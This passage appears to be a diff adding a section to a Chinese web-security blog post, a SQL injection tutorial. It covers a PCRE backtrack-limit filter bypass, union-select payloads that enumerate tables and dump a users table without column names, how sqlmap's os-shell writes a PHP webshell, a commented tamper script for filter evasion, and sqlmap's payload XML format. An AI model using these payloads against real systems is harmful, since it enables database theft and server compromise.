@@ -191,7 +191,53 @@
 <h2 id="PCRE绕过"><a href="#PCRE绕过" class="headerlink" title="PCRE绕过"></a>PCRE绕过</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">PHP 的 pcre.backtrack_limit 限制利用</span><br><span class="line"><span class="keyword">union</span><span class="comment">/*aaaaaaaxN*/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure>
 
 <p><font color="red"> 上面的还不行就尝试修改语句逻辑再绕过试试</font> </p>
-]]></content>
+<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a><center>无列名注入</center></h1><p>遇到information_schema.tables被过滤、转义、删除的情况下使用</p>
+<p>Payload</p>
+<p>猜表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>
+
+<p>猜数据</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)/**/as/**/b),</span></span><br><span class="line"><span class="string">3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a><center>Sqlmap</center></h1><h2 id="–os-shell的原理"><a href="#–os-shell的原理" class="headerlink" title="–os-shell的原理"></a>–os-shell的原理</h2><ul>
+<li>使用条件<ol>
+<li>网站必须是root权限</li>
+<li>攻击者需要知道网站的绝对路径</li>
+<li>GPC为off，php主动转义的功能关闭</li>
+</ol>
+</li>
+</ul>
+<p>用into outfile函数将一个可以用来上传的php文件写到网站的根目录下</p>
+<p><a href="https://sm.ms/image/unsKjTko6QxSAY3" target="_blank"><img src="https://s2.loli.net/2022/02/25/unsKjTko6QxSAY3.png" ></a></p>
+<p>也就是上传一个功能马</p>
+<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##此处用法为：程序到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多行注释符，此处为三个双引号，因为是其中也有单引号，并且该说明为一般文档说明，故用三个双引号</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re   <span class="comment">#导入python中的re 字符替换包，方便下面的字符替换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb <span class="comment">#导入sqlmap中lib\core\data中的kb函数，测试 SQL 注入的过程中，使用的配置文件事先全部被加载到了 conf 和 kb</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY  <span class="comment">#导入sqlmap中lib\core\enums中的PRIORITY函数， LOWEST = -100，LOWER = -50，. 详细见enums.py</span></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL <span class="comment">#定义优先级，此处为级别为【一般】</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():  <span class="comment">#定义dependencies():此处是为了和整体脚本的结构保持一致。</span></span><br><span class="line">    <span class="keyword">pass</span>   <span class="comment">#pass 不做任何事情，一般用做占位语句。为了保持程序结构的完整性。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):  <span class="comment">#定义tamper脚本，payload, **kwargs 为定义的参数，其中**kwargs为字典存储，类似于 &#123;&#x27;a&#x27;: 1, &#x27;c&#x27;: 3, &#x27;b&#x27;: 2&#125; </span></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%0a&quot;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;like&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="增加新的Payload"><a href="#增加新的Payload" class="headerlink" title="增加新的Payload"></a>增加新的Payload</h2><p>目录在<code>./data/xml/payload</code></p>
+<p>可以看到6个xml文件</p>
+<p><a href="https://sm.ms/image/cjM2FqdQuzpoN9C" target="_blank"><img src="https://s2.loli.net/2022/02/25/cjM2FqdQuzpoN9C.png" ></a></p>
+<p>拿<code>boolean_blind.xml文件</code>里面的一部分来分析</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">title</span>&gt;</span>SAP MaxDB boolean-based blind - Stacked queries<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">stype</span>&gt;</span>1<span class="tag">&lt;/<span class="name">stype</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">level</span>&gt;</span>5<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">risk</span>&gt;</span>1<span class="tag">&lt;/<span class="name">risk</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">clause</span>&gt;</span>1-8<span class="tag">&lt;/<span class="name">clause</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">where</span>&gt;</span>1<span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">vector</span>&gt;</span>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">payload</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">payload</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comment</span>&gt;</span>--<span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comparison</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">comparison</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">details</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">dbms</span>&gt;</span>SAP MaxDB<span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>title<br>  title属性为当前测试Payload的标题，通过标题就可以了解当前的注入手法与测试的数据库类型。</li>
+<li>stype<br>  查询类型。</li>
+<li>level<br>  风险等级(1-5,默认1)。</li>
+<li>risk<br>  危险等级(1-3,默认1)。</li>
+<li>clause<br>  指定为每个payload使用的SQL查询从句。<br>  <a href="https://sm.ms/image/7Ftj9qHuXD1zeUV" target="_blank"><img src="https://s2.loli.net/2022/02/25/7Ftj9qHuXD1zeUV.png" ></a></li>
+<li>where<br>  与上图一致。</li>
+<li>vector<br>  指定将使用的注入模版。</li>
+<li>payload<br>  测试使用的payload ,[RANDNUM]，[DELIMITER_START]，[DELIMITER_STOP]分别代表着随机数值与字符。当SQLMap扫描时会把对应的随机数替换掉,然后再与boundary的前缀与后缀拼接起来,最终成为测试的Payload。</li>
+<li>common<br>  payload 之后，boundary 拼接的后缀suffix之前。</li>
+<li>char<br>  在union 查询中爆破列时所用的字符。</li>
+<li>columns<br>  联合查询测试的列数范围。</li>
+<li>response<br>  根据回显辨别这次注入的payload是否成功。</li>
+<li>comparison<br>  使用字符串作为payload执行请求，将响应和负载响应进行对比，在基于布尔值的盲注中有效。</li>
+<li>grep<br>  使用正则表达式去批结响应，判断时候注入成功，在基于错误的注入中有用。</li>
+<li>time<br>  在基于time的注入中等待结果返回的所需要的时间</li>
+<li>detail<br>  下设三个子节点</li>
+</ul>
+<p>最终的payload为：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">where</span> <span class="operator">+</span> boundary.prefix<span class="operator">+</span>test.payload <span class="operator">+</span> test.common <span class="operator">+</span> <span class="operator">+</span>boundary.suffix</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
